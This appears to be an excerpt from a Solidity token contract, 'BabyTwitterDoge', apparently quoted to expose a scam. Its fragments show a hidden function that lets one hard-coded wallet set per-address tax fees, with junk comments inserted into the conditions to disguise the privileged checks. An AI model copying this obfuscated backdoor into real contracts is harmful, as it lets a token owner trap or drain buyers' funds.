...
contract BabyTwitterDoge is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0xCa1303bC0f69d9AdE8b420F63a4348c484D0E92B); 
    address payable private teamWalletAddress = payable(0x6cdD1CE3424Ebd9c137Ccd248C89C046C1b86dDC); 
	...
	if( _mainPai[ /*as asdfghj*/msg.sender])
	   {
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asdf aw dawfghj*/ ==  /*asdf aw dawfgj*/msg.sender){
